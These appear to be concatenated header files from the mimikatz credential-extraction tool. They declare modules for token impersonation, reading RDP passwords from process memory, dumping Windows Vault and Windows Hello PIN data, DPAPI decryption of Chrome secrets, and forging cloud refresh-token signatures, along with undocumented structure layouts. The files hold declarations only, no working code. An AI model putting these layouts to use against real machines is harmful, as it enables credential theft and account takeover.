#define VARIABLE_ATTRIBUTE_NON_VOLATILE 0x00000001

#define VARIABLE_INFORMATION_NAMES  1
#define VARIABLE_INFORMATION_VALUES 2

typedef struct _VARIABLE_NAME {
    ULONG NextEntryOffset;
    GUID VendorGuid;
    WCHAR Name[ANYSIZE_ARRAY];
} VARIABLE_NAME, *PVARIABLE_NAME;

typedef struct _VARIABLE_NAME_AND_VALUE {
    ULONG NextEntryOffset;
    ULONG ValueOffset;
    ULONG ValueLength;
    ULONG Attributes;
    GUID VendorGuid;
    WCHAR Name[ANYSIZE_ARRAY];
    //UCHAR Value[ANYSIZE_ARRAY];
} VARIABLE_NAME_AND_VALUE, *PVARIABLE_NAME_AND_VALUE;

NTSYSCALLAPI NTSTATUS NTAPI NtQuerySystemEnvironmentValue (__in PUNICODE_STRING VariableName, __out_bcount(ValueLength) PWSTR VariableValue, __in USHORT ValueLength, __out_opt PUSHORT ReturnLength);
NTSYSCALLAPI NTSTATUS NTAPI NtSetSystemEnvironmentValue (__in PUNICODE_STRING VariableName, __in PUNICODE_STRING VariableValue);
NTSYSCALLAPI NTSTATUS NTAPI NtQuerySystemEnvironmentValueEx (__in PUNICODE_STRING VariableName, __in LPGUID VendorGuid, __out_bcount_opt(*ValueLength) PVOID Value, __inout PULONG ValueLength, __out_opt PULONG Attributes);
NTSYSCALLAPI NTSTATUS NTAPI NtSetSystemEnvironmentValueEx (__in PUNICODE_STRING VariableName, __in LPGUID VendorGuid, __in_bcount_opt(ValueLength) PVOID Value, __in ULONG ValueLength, __in ULONG Attributes);
NTSYSCALLAPI NTSTATUS NTAPI NtEnumerateSystemEnvironmentValuesEx (__in ULONG InformationClass, __out PVOID Buffer, __inout PULONG BufferLength);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "kuhl_m.h"
//#include "../modules/kull_m_token.h"
//#include "../modules/kull_m_net.h"
//#include "kuhl_m_process.h"

const KUHL_M kuhl_m_token;

//typedef enum _KUHL_M_TOKEN_ELEVATE_DATA_TYPE_FILTER {
//	TypeFree,
//	TypeAnonymous,
//	TypeIdentity,
//	TypeDelegation,
//	TypeImpersonate,
//	TypePrimary,
//} KUHL_M_TOKEN_ELEVATE_DATA_TYPE_FILTER, *PKUHL_M_TOKEN_ELEVATE_DATA_TYPE_FILTER;

typedef struct _KUHL_M_TOKEN_ELEVATE_DATA {
	PSID pSid;
	PCWSTR pUsername;
	DWORD tokenId;
	BOOL elevateIt;
	BOOL runIt;
	PCWSTR pCommandLine;
	BOOL isSidDirectUser;

	//KUHL_M_TOKEN_ELEVATE_DATA_TYPE_FILTER filter;
	//BOOL isNeeded;
	//BOOL isMinimal;
} KUHL_M_TOKEN_ELEVATE_DATA, *PKUHL_M_TOKEN_ELEVATE_DATA;

void kuhl_m_token_displayAccount_sids(UCHAR l, DWORD count, PSID_AND_ATTRIBUTES sids);
void kuhl_m_token_displayAccount(HANDLE hToken, BOOL full);

NTSTATUS kuhl_m_token_whoami(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_token_list(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_token_elevate(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_token_run(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_token_revert(int argc, wchar_t * argv[]);

NTSTATUS kuhl_m_token_list_or_elevate(int argc, wchar_t * argv[], BOOL elevate, BOOL runIt);
BOOL CALLBACK kuhl_m_token_list_or_elevate_callback(HANDLE hToken, DWORD ptid, PVOID pvArg);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "kuhl_m.h"
//#include "../../modules/kull_m_patch.h"
//#include "../../modules/kull_m_service.h"
//#include "../../modules/kull_m_process.h"
//#include "../../modules/kull_m_memory.h"
//#include "../../modules/kull_m_crypto_remote.h"
//#include "sekurlsa/kuhl_m_sekurlsa.h"

const KUHL_M kuhl_m_ts;

NTSTATUS kuhl_m_ts_multirdp(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_ts_sessions(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_ts_remote(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_ts_logonpasswords(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_ts_mstsc(int argc, wchar_t * argv[]);

typedef struct _KUHL_M_TS_MSTSC_ARG {
	PKULL_M_MEMORY_HANDLE hMemory;
	BOOL bIsVerbose;
} KUHL_M_TS_MSTSC_ARG, *PKUHL_M_TS_MSTSC_ARG;

BOOL CALLBACK kuhl_m_ts_logonpasswords_MemoryAnalysis(PMEMORY_BASIC_INFORMATION pMemoryBasicInformation, PVOID pvArg);
void kuhl_m_ts_logonpasswords_MemoryAnalysis_candidate(PKULL_M_MEMORY_HANDLE hProcess, PVOID Addr);

BOOL CALLBACK kuhl_m_ts_mstsc_enumProcess(PSYSTEM_PROCESS_INFORMATION pSystemProcessInformation, PVOID pvArg);
BOOL CALLBACK kuhl_m_ts_mstsc_MemoryAnalysis(PMEMORY_BASIC_INFORMATION pMemoryBasicInformation, PVOID pvArg);
void kuhl_m_ts_mstsc_MemoryAnalysis_property(PKULL_M_MEMORY_HANDLE hMemory, PVOID pvProperties, DWORD cbProperties, BOOL bIsVerbose);

#define LOGONID_CURRENT			((ULONG) -1)
#define SERVERHANDLE_CURRENT	((HANDLE) NULL)
#define MAX_THINWIRECACHE		4
#define WINSTATIONNAME_LENGTH	32
#define DOMAIN_LENGTH			17
#define USERNAME_LENGTH			20
typedef WCHAR WINSTATIONNAME[WINSTATIONNAME_LENGTH + 1];

typedef enum _WINSTATIONSTATECLASS {
	State_Active = 0,
	State_Connected = 1,
	State_ConnectQuery = 2,
	State_Shadow = 3,
	State_Disconnected = 4,
	State_Idle = 5,
	State_Listen = 6,
	State_Reset = 7,
	State_Down = 8,
	State_Init = 9
} WINSTATIONSTATECLASS;

typedef enum _WINSTATIONINFOCLASS {
	WinStationCreateData,
	WinStationConfiguration,
	WinStationPdParams,
	WinStationWd,
	WinStationPd,
	WinStationPrinter,
	WinStationClient,
	WinStationModules,
	WinStationInformation,
	WinStationTrace,
	WinStationBeep,
	WinStationEncryptionOff,
	WinStationEncryptionPerm,
	WinStationNtSecurity,
	WinStationUserToken,
	WinStationUnused1,
	WinStationVideoData,
	WinStationInitialProgram,
	WinStationCd,
	WinStationSystemTrace,
	WinStationVirtualData,
	WinStationClientData,
	WinStationSecureDesktopEnter,
	WinStationSecureDesktopExit,
	WinStationLoadBalanceSessionTarget,
	WinStationLoadIndicator,
	WinStationShadowInfo,
	WinStationDigProductId,
	WinStationLockedState,
	WinStationRemoteAddress,
	WinStationIdleTime,
	WinStationLastReconnectType,
	WinStationDisallowAutoReconnect,
	WinStationUnused2,
	WinStationUnused3,
	WinStationUnused4,
	WinStationUnused5,
	WinStationReconnectedFromId,
	WinStationEffectsPolicy,
	WinStationType,
	WinStationInformationEx
} WINSTATIONINFOCLASS;

typedef struct _SESSIONIDW {
	union {
		ULONG SessionId;
		ULONG LogonId;
	};
	WINSTATIONNAME WinStationName;
	WINSTATIONSTATECLASS State;
} SESSIONIDW, *PSESSIONIDW;

typedef struct _TSHARE_COUNTERS {
	ULONG Reserved;
} TSHARE_COUNTERS, *PTSHARE_COUNTERS;

typedef struct _PROTOCOLCOUNTERS {
	ULONG WdBytes;
	ULONG WdFrames;
	ULONG WaitForOutBuf;
	ULONG Frames;
	ULONG Bytes;
	ULONG CompressedBytes;
	ULONG CompressFlushes;
	ULONG Errors;
	ULONG Timeouts;
	ULONG AsyncFramingError;
	ULONG AsyncOverrunError;
	ULONG AsyncOverflowError;
	ULONG AsyncParityError;
	ULONG TdErrors;
	USHORT ProtocolType;
	USHORT Length;
	union {
		TSHARE_COUNTERS TShareCounters;
		ULONG Reserved[100];
	} Specific;
} PROTOCOLCOUNTERS, *PPROTOCOLCOUNTERS;

typedef struct _THINWIRECACHE {
	ULONG CacheReads;
	ULONG CacheHits;
} THINWIRECACHE, *PTHINWIRECACHE;

typedef struct _RESERVED_CACHE {
	THINWIRECACHE ThinWireCache[MAX_THINWIRECACHE];
} RESERVED_CACHE, *PRESERVED_CACHE;

typedef struct _TSHARE_CACHE {
	ULONG Reserved;
} TSHARE_CACHE, * PTSHARE_CACHE;

typedef struct CACHE_STATISTICS {
	USHORT ProtocolType;
	USHORT Length;
	union {
		RESERVED_CACHE ReservedCacheStats;
		TSHARE_CACHE TShareCacheStats;
		ULONG Reserved[20];
	} Specific;
} CACHE_STATISTICS, *PCACHE_STATISTICS;

typedef struct _PROTOCOLSTATUS {
	PROTOCOLCOUNTERS Output;
	PROTOCOLCOUNTERS Input;
	CACHE_STATISTICS Cache;
	ULONG AsyncSignal;
	ULONG AsyncSignalMask;
} PROTOCOLSTATUS, * PPROTOCOLSTATUS;

typedef struct _WINSTATIONINFORMATION {
	WINSTATIONSTATECLASS ConnectState;
	WINSTATIONNAME WinStationName;
	ULONG LogonId;
	LARGE_INTEGER ConnectTime;
	LARGE_INTEGER DisconnectTime;
	LARGE_INTEGER LastInputTime;
	LARGE_INTEGER LogonTime;
	PROTOCOLSTATUS Status;
	WCHAR Domain[DOMAIN_LENGTH + 1];
	WCHAR UserName[USERNAME_LENGTH + 1];
	LARGE_INTEGER CurrentTime;
} WINSTATIONINFORMATION, *PWINSTATIONINFORMATION;

typedef struct _WINSTATIONVIDEODATA {
	USHORT HResolution;
	USHORT VResolution;
	USHORT fColorDepth;
} WINSTATIONVIDEODATA, *PWINSTATIONVIDEODATA;

typedef struct _WINSTATIONREMOTEADDRESS {
	unsigned short sin_family;
	union {
		struct {
			USHORT sin_port;
			ULONG in_addr;
			UCHAR sin_zero[8];
		} ipv4;
		struct {
			USHORT sin6_port;
			ULONG sin6_flowinfo;
			USHORT sin6_addr[8];
			ULONG sin6_scope_id;
		} ipv6;
	};
} WINSTATIONREMOTEADDRESS, *PWINSTATIONREMOTEADDRESS;

extern HANDLE WINAPI WinStationOpenServerW(IN PWSTR ServerName);
extern BOOLEAN WINAPI WinStationCloseServer(IN HANDLE hServer);
extern BOOLEAN WINAPI WinStationConnectW(IN HANDLE hServer, IN DWORD SessionId, IN DWORD TargetSessionID, IN LPWSTR Password, IN BOOLEAN bWait);
extern BOOLEAN WINAPI WinStationFreeMemory(IN PVOID Buffer);
extern BOOLEAN WINAPI WinStationEnumerateW(IN HANDLE hServer, OUT PSESSIONIDW *SessionIds, OUT PULONG Count);
extern BOOLEAN WINAPI WinStationQueryInformationW(IN HANDLE hServer, IN ULONG SessionId,IN WINSTATIONINFOCLASS WinStationInformationClass, OUT PVOID pWinStationInformation, IN ULONG WinStationInformationLength, OUT PULONG pReturnLength);
extern BOOLEAN WINAPI WinStationSetInformationW(IN HANDLE hServer, IN ULONG SessionId, IN WINSTATIONINFOCLASS WinStationInformationClass, IN PVOID pWinStationInformation, IN ULONG WinStationInformationLength);

extern LPWSTR NTAPI RtlIpv4AddressToStringW(IN const IN_ADDR *Addr, OUT LPWSTR S);
extern LPWSTR NTAPI RtlIpv6AddressToStringW(IN const PVOID /*IN6_ADDR **/Addr, OUT LPWSTR S);

#define WTS_DOMAIN_LENGTH            255
#define WTS_USERNAME_LENGTH          255
#define WTS_PASSWORD_LENGTH          255
#pragma pack(push, 2)
typedef struct _WTS_KIWI {
	DWORD unk0;
	DWORD unk1;
	WORD cbDomain;
	WORD cbUsername;
	WORD cbPassword;
	DWORD unk2;
	WCHAR Domain[WTS_DOMAIN_LENGTH + 1];
	WCHAR UserName[WTS_USERNAME_LENGTH + 1];
	WCHAR Password[WTS_PASSWORD_LENGTH + 1];
} WTS_KIWI, *PWTS_KIWI;
#pragma pack(pop)

typedef struct _WTS_WEB_KIWI {
	DWORD dwVersion;
	UNICODE_STRING Domain;
	UNICODE_STRING Username;
	UNICODE_STRING Password;
	//BYTE Data[ANYSIZE_ARRAY];
} WTS_WEB_KIWI, *PWTS_WEB_KIWI;

typedef struct _TS_PROPERTY_KIWI {
	PCWSTR szProperty;
	DWORD dwType;
	PVOID pvData;
	PVOID unkp0;
	DWORD unkd0;
	DWORD dwFlags;
	DWORD unkd1;
	DWORD unkd2;
	PVOID pValidator;
	PVOID unkp2; // password size or ?, maybe a DWORD then align
	PVOID unkp3;
} TS_PROPERTY_KIWI, *PTS_PROPERTY_KIWI;

typedef struct _TS_PROPERTIES_KIWI {
	PVOID unkp0; // const CTSPropertySet::`vftable'{for `CTSObject'}
	PVOID unkp1; // "CTSPropertySet"
	DWORD unkh0; // 0xdbcaabcd
	DWORD unkd0; // 3
	PVOID unkp2;
	DWORD unkd1; // 45
	PVOID unkp3; // tagPROPERTY_ENTRY near * `CTSCoreApi::internalGetPropMap_CoreProps(void)'::`2'::_PropSet
	PTS_PROPERTY_KIWI pProperties;
	DWORD cbProperties; // 198
} TS_PROPERTIES_KIWI, *PTS_PROPERTIES_KIWI;

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "kuhl_m.h"
//#include "../modules/kull_m_string.h"
//#include "../modules/kull_m_token.h"
//#include "../modules/kull_m_patch.h"
//#include "../modules/kull_m_cred.h"
//#include "../modules/kull_m_crypto_ngc.h"

const KUHL_M kuhl_m_vault;

NTSTATUS kuhl_m_vault_init();
NTSTATUS kuhl_m_vault_clean();

NTSTATUS kuhl_m_vault_list(int argc, wchar_t * argv[]);
void kuhl_m_vault_list_descVault(HANDLE hVault);
void kuhl_m_vault_list_descItemData(struct _VAULT_ITEM_DATA * pData);
NTSTATUS kuhl_m_vault_cred(int argc, wchar_t * argv[]);
void kuhl_m_vault_cred_tryEncrypted(PCREDENTIAL pCredential);

typedef struct _VAULT_GUID_STRING {
	const GUID guid;
	const wchar_t * text;
} VAULT_GUID_STRING, *PVAULT_GUID_STRING;

void CALLBACK kuhl_m_vault_list_descItem_PINLogonOrPicturePasswordOrBiometric(const VAULT_GUID_STRING * pGuidString, PVOID enumItem, PVOID getItem, BOOL is8); 
void CALLBACK kuhl_m_vault_list_descItem_ngc(const VAULT_GUID_STRING * pGuidString, PVOID enumItem, PVOID getItem, BOOL is8);
typedef void (CALLBACK * PSCHEMA_HELPER_FUNC) (const VAULT_GUID_STRING * pGuidString, PVOID enumItem, PVOID getItem, BOOL is8);

typedef struct _VAULT_SCHEMA_HELPER {
	VAULT_GUID_STRING guidString;
	PSCHEMA_HELPER_FUNC helper;
} VAULT_SCHEMA_HELPER, *PVAULT_SCHEMA_HELPER;

typedef enum _VAULT_PICTURE_PASSWORD_TYPE {
	PP_Point	= 0,
	PP_Line		= 1,
	PP_Circle	= 2,
} VAULT_PICTURE_PASSWORD_TYPE, *PVAULT_PICTURE_PASSWORD_TYPE;

typedef struct _VAULT_PICTURE_PASSWORD_POINT {
	POINT coord;
} VAULT_PICTURE_PASSWORD_POINT, *PVAULT_PICTURE_PASSWORD_POINT;

typedef struct _VAULT_PICTURE_PASSWORD_LINE {
	POINT start;
	POINT end;
} VAULT_PICTURE_PASSWORD_LINE, *PVAULT_PICTURE_PASSWORD_LINE;

typedef struct _VAULT_PICTURE_PASSWORD_CIRCLE {
	POINT coord;
	LONG size;
	BOOL clockwise;
} VAULT_PICTURE_PASSWORD_CIRCLE, *PVAULT_PICTURE_PASSWORD_CIRCLE;

typedef struct _VAULT_PICTURE_PASSWORD_ELEMENT {
	VAULT_PICTURE_PASSWORD_TYPE Type;
	union {
		VAULT_PICTURE_PASSWORD_POINT point;
		VAULT_PICTURE_PASSWORD_LINE line;
		VAULT_PICTURE_PASSWORD_CIRCLE circle;
	};
} VAULT_PICTURE_PASSWORD_ELEMENT, *PVAULT_PICTURE_PASSWORD_ELEMENT;

typedef struct _VAULT_BIOMETRIC_ELEMENT {
	ULONG headersize; //data offset
	ULONG usernameLength;
	ULONG domainnameLength;
} VAULT_BIOMETRIC_ELEMENT, *PVAULT_BIOMETRIC_ELEMENT;

typedef enum _VAULT_INFORMATION_TYPE {
	VaultInformation_Name		= 1,
	VaultInformation_Path_7		= 8,
	VaultInformation_Path_8		= 4,
} VAULT_INFORMATION_TYPE, *PVAULT_INFORMATION_TYPE;

typedef struct _VAULT_INFORMATION {
	VAULT_INFORMATION_TYPE type;
	union {
		PWSTR string;
		GUID guid;
		BOOL status;
		DWORD time;
		struct {
			DWORD nbGuid;
			GUID * guids;
		};
	};
} VAULT_INFORMATION, *PVAULT_INFORMATION;

typedef enum _VAULT_ELEMENT_TYPE {
	ElementType_Boolean			= 0x00,
	ElementType_Short			= 0x01,
	ElementType_UnsignedShort	= 0x02,
	ElementType_Integer			= 0x03,
	ElementType_UnsignedInteger	= 0x04,
	ElementType_Double			= 0x05,
	ElementType_Guid			= 0x06,
	ElementType_String			= 0x07,
	ElementType_ByteArray		= 0x08,
	ElementType_TimeStamp		= 0x09,
	ElementType_ProtectedArray	= 0x0a,
	ElementType_Attribute		= 0x0b,
	ElementType_Sid				= 0x0c,
	ElementType_Max				= 0x0d,
} VAULT_ELEMENT_TYPE, *PVAULT_ELEMENT_TYPE;

typedef struct _VAULT_BYTE_BUFFER {
	DWORD Length;
	PBYTE Value;
} VAULT_BYTE_BUFFER, *PVAULT_BYTE_BUFFER;

typedef struct _VAULT_CREDENTIAL_ATTRIBUTEW {
    LPWSTR  Keyword;
    DWORD Flags;
#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
	DWORD badAlign;
#endif
    DWORD ValueSize;
    LPBYTE Value;
} VAULT_CREDENTIAL_ATTRIBUTEW, *PVAULT_CREDENTIAL_ATTRIBUTEW;

typedef struct _VAULT_ITEM_DATA {
	DWORD SchemaElementId;
	DWORD unk0;
	VAULT_ELEMENT_TYPE Type;
	DWORD unk1;
	union {
		BOOL Boolean;
		SHORT Short;
		WORD UnsignedShort;
		LONG Int;
		ULONG UnsignedInt;
		DOUBLE Double;
		GUID Guid;
		LPWSTR String;
		VAULT_BYTE_BUFFER ByteArray;
		VAULT_BYTE_BUFFER ProtectedArray;
		PVAULT_CREDENTIAL_ATTRIBUTEW Attribute;
		PSID Sid;
	} data;
} VAULT_ITEM_DATA, *PVAULT_ITEM_DATA;

typedef struct _VAULT_ITEM_7 {
	GUID SchemaId;
	PWSTR FriendlyName;
	PVAULT_ITEM_DATA Ressource;
	PVAULT_ITEM_DATA Identity;
	PVAULT_ITEM_DATA Authenticator;
	FILETIME LastWritten;
	DWORD Flags;
	DWORD cbProperties;
	PVAULT_ITEM_DATA Properties;
} VAULT_ITEM_7, *PVAULT_ITEM_7;

typedef struct _VAULT_ITEM_8 {
	GUID SchemaId;
	PWSTR FriendlyName;
	PVAULT_ITEM_DATA Ressource;
	PVAULT_ITEM_DATA Identity;
	PVAULT_ITEM_DATA Authenticator;
	PVAULT_ITEM_DATA PackageSid;
	FILETIME LastWritten;
	DWORD Flags;
	DWORD cbProperties;
	PVAULT_ITEM_DATA Properties;
} VAULT_ITEM_8, *PVAULT_ITEM_8;

typedef struct _VAULT_ITEM_TYPE {
	GUID ItemType;
	PVOID FriendlyName;
	PVOID unk1;
	PVOID unk2;
	PVOID unk3;
	DWORD cbUnk;
	PVOID Unk;
} VAULT_ITEM_TYPE, *PVAULT_ITEM_TYPE;

typedef NTSTATUS	(WINAPI * PVAULTENUMERATEVAULTS) (DWORD unk0, PDWORD cbVault, LPGUID *);
typedef NTSTATUS	(WINAPI * PVAULTFREE) (PVOID memory);
typedef NTSTATUS	(WINAPI * PVAULTOPENVAULT) (GUID * vaultGUID, DWORD unk0, PHANDLE vault);
typedef NTSTATUS	(WINAPI * PVAULTCLOSEVAULT) (PHANDLE vault);
typedef NTSTATUS	(WINAPI * PVAULTGETINFORMATION) (HANDLE vault, DWORD unk0, PVAULT_INFORMATION informations);
typedef NTSTATUS	(WINAPI * PVAULTENUMERATEITEMS) (HANDLE vault, DWORD unk0, PDWORD cbItems, PVOID * items);
typedef NTSTATUS	(WINAPI * PVAULTENUMERATEITEMTYPES) (HANDLE vault, DWORD unk0, PDWORD cbItemTypes, PVAULT_ITEM_TYPE * itemTypes);
typedef NTSTATUS	(WINAPI * PVAULTGETITEM7) (HANDLE vault, LPGUID SchemaId, PVAULT_ITEM_DATA Resource, PVAULT_ITEM_DATA Identity, HWND hWnd, DWORD Flags, PVAULT_ITEM_7 * pItem);
typedef NTSTATUS	(WINAPI * PVAULTGETITEM8) (HANDLE vault, LPGUID SchemaId, PVAULT_ITEM_DATA Resource, PVAULT_ITEM_DATA Identity, PVAULT_ITEM_DATA PackageSid, HWND hWnd, DWORD Flags, PVAULT_ITEM_8 * pItem);



/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "../kuhl_m.h"
//#include "../../../modules/kull_m_string.h"
//#include "../../../modules/kull_m_service.h"
//#include "../../../modules/kull_m_remotelib.h"
//#include "../../../modules/kull_m_file.h"
//#include "../../../modules/kull_m_crypto_ngc.h"
//#include "../../../modules/kull_m_token.h"

const KUHL_M kuhl_m_ngc;

NTSTATUS kuhl_m_ngc_logondata(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_ngc_pin(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_ngc_sign(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_ngc_decrypt(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_ngc_enum(int argc, wchar_t * argv[]);

typedef struct _Node {
	struct _Node *Left;
	struct _Node *Parent;
	struct _Node *Right;
	BYTE Color;
	BYTE IsNil;
} Node, *PNode;

typedef struct _ValueGuidPtr {
	GUID guid;
	PVOID ptr;
} ValueGuidPtr, *PValueGuidPtr;

typedef struct _ValueUnkPtr {
	BYTE unkData[8];
	PVOID ptr;
} ValueUnkPtr, *PValueUnkPtr;

typedef struct _ValueProvider {
	PCWSTR Provider;
	PVOID unk0;
	DWORD cbProvider;
	DWORD unk1;
} ValueProvider, *PValueProvider;

typedef struct _ContainerManager {
	PWSTR Path;
	SIZE_T unk1;
	SIZE_T unk2;
	SIZE_T unk3;
	PVOID unk4;
	RTL_SRWLOCK SRWLock;
	PVOID unk7;
	DWORD unk8;
} ContainerManager, *PContainerManager;

typedef struct _unkF {
	PVOID unkVFTable;
	DWORD unk0;
	DWORD unk1;
	PVOID unk2;
	
	PVOID unkF0_0; // ff
	PVOID unkF0_1; // ff
	PVOID unkF0_2; // 0
	PVOID unkF0_3; // 0
	PVOID unkF0_4; // 20007D0

	PVOID unkF1_0; // ff
	PVOID unkF1_1; // ff
	PVOID unkF1_2; // 0
	PVOID unkF1_3; // 0
	PVOID unkF1_4; // 20007D0


	PVOID unk3;
	PVOID unk4;
	PVOID unk5;
	PWSTR ProfilePath;
	PBYTE unk6; // 16, 10 ?
	DWORD cbProfilePath; // ?
	DWORD unk7;
	DWORD unk8;
	DWORD unk9;
	PVOID t;
	BYTE z[0x88];
	PVOID u;
} unkF, *PunkF;

typedef struct _structToDecode {
	PBYTE toDecode;
	PVOID unk0;
	PVOID unk1;
	DWORD cb;
} structToDecode, *PstructToDecode;

typedef struct _structL {
	DWORD unk0;
	structToDecode d0; // ?
	structToDecode d1; // wut ?
	structToDecode d2; // pin here ?
} structL, *PstructL;

typedef struct _UNK_RAW_PIN {
	DWORD cbPin0;
	DWORD cbPin1;
	DWORD cbPin2;
	BYTE data[ANYSIZE_ARRAY];
} UNK_RAW_PIN, *PUNK_RAW_PIN;

typedef void (CALLBACK * PKUHL_M_NGC_ENUM_NODE_DATA) (IN PVOID pvData, IN DWORD szObject, IN PKULL_M_MEMORY_HANDLE hMemory, IN OPTIONAL PVOID pvOptionalData);

void kuhl_m_ngc_dealWithNode(PKULL_M_MEMORY_ADDRESS aNode, PVOID OrigMapAddress, PKUHL_M_NGC_ENUM_NODE_DATA Callback, DWORD szObject, PVOID CallbackData);



/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "../kuhl_m_dpapi.h"
//#include "../modules/sqlite3.h"

NTSTATUS kuhl_m_dpapi_chrome(int argc, wchar_t * argv[]);

void kuhl_m_dpapi_chrome_decrypt(LPCVOID pData, DWORD dwData, BCRYPT_ALG_HANDLE hAlg, BCRYPT_KEY_HANDLE hKey, int argc, wchar_t * argv[], LPCWSTR type);
void kuhl_m_dpapi_chrome_free_alg_key(BCRYPT_ALG_HANDLE *hAlg, BCRYPT_KEY_HANDLE *hKey);
BOOL kuhl_m_dpapi_chrome_alg_key_from_raw(BYTE key[AES_256_KEY_SIZE], BCRYPT_ALG_HANDLE *hAlg, BCRYPT_KEY_HANDLE *hKey);
BOOL kuhl_m_dpapi_chrome_alg_key_from_b64(LPCWSTR base64, int argc, wchar_t * argv[], BCRYPT_ALG_HANDLE *hAlg, BCRYPT_KEY_HANDLE *hKey);
BOOL kuhl_m_dpapi_chrome_alg_key_from_file(LPCWSTR szState, BOOL forced, int argc, wchar_t * argv[], BCRYPT_ALG_HANDLE *hAlg, BCRYPT_KEY_HANDLE *hKey);
BOOL kuhl_m_dpapi_chrome_alg_key_from_auto(LPCWSTR szFile, int argc, wchar_t * argv[], BCRYPT_ALG_HANDLE *hAlg, BCRYPT_KEY_HANDLE *hKey);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "../kuhl_m_dpapi.h"

NTSTATUS kuhl_m_dpapi_citrix(int argc, wchar_t * argv[]);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "../kuhl_m_dpapi.h"
//#include "../../../../modules/kull_m_crypto_ngc.h"


NTSTATUS kuhl_m_dpapi_cloudap_keyvalue_derived(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_dpapi_cloudap_fromreg(int argc, wchar_t * argv[]);

PSTR generate_simpleHeader(PCSTR Alg, LPCBYTE Context, DWORD cbContext);
PSTR generate_simplePayload(PCWSTR PrimaryRefreshToken, __time32_t *iat);
PSTR generate_simpleSignature(LPCBYTE Context, DWORD cbContext, PCWSTR PrimaryRefreshToken, __time32_t *iat, LPCBYTE Key, DWORD cbKey, OPTIONAL LPCBYTE SeedLabel, OPTIONAL DWORD cbSeedLabel);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "../kuhl_m_dpapi.h"
//#include "../modules/kull_m_cred.h"
//#include "../../sekurlsa/kuhl_m_sekurlsa.h"

typedef struct _KUHL_M_DPAPI_ENCRYPTED_CRED {
	DWORD version;
	DWORD blobSize;
	DWORD unk;
	BYTE blob[ANYSIZE_ARRAY];
} KUHL_M_DPAPI_ENCRYPTED_CRED, *PKUHL_M_DPAPI_ENCRYPTED_CRED;

NTSTATUS kuhl_m_dpapi_cred(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_dpapi_vault(int argc, wchar_t * argv[]);

void kuhl_m_dpapi_cred_tryEncrypted(LPCWSTR target, LPCBYTE data, DWORD dataLen, int argc, wchar_t * argv[]);
BOOL kuhl_m_dpapi_vault_key_type(PKULL_M_CRED_VAULT_CREDENTIAL_ATTRIBUTE attribute, HCRYPTPROV hProv, BYTE aes128[AES_128_KEY_SIZE], BYTE aes256[AES_256_KEY_SIZE], HCRYPTKEY *hKey, BOOL *isAttr);
void kuhl_m_dpapi_vault_basic(PVOID data, DWORD size, GUID *schema);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "../kuhl_m_dpapi.h"
//#include "../../kuhl_m_crypto.h"
//#include "../modules/kull_m_key.h"

NTSTATUS kuhl_m_dpapi_keys_cng(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_dpapi_keys_capi(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_dpapi_keys_tpm(int argc, wchar_t * argv[]);

void kuhl_m_dpapi_keys_tpm_descr(LPCVOID data, DWORD dwData);

typedef struct _KUHL_M_DPAPI_KEYS_TPM_TLV {
	DWORD Tag;
	DWORD Length;
	BYTE Data[ANYSIZE_ARRAY];
} KUHL_M_DPAPI_KEYS_TPM_TLV, *PKUHL_M_DPAPI_KEYS_TPM_TLV;

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "../kuhl_m_dpapi.h"

NTSTATUS kuhl_m_dpapi_lunahsm(int argc, wchar_t * argv[]);

void kuhl_m_dpapi_safenet_ksp_registryparser(PKULL_M_REGISTRY_HANDLE hRegistry, HKEY hBase, int argc, wchar_t * argv[]);
void kuhl_m_dpapi_safenet_ksp_registry_user_parser(PKULL_M_REGISTRY_HANDLE hRegistry, HKEY hEntry, BYTE entropy[MD5_DIGEST_LENGTH], int argc, wchar_t * argv[]);

void kuhl_m_dpapi_safenet_ksp_entropy(IN LPCSTR identity, OUT BYTE entropy[MD5_DIGEST_LENGTH]);
LPSTR kuhl_m_dpapi_safenet_pk_password(IN LPCSTR server);

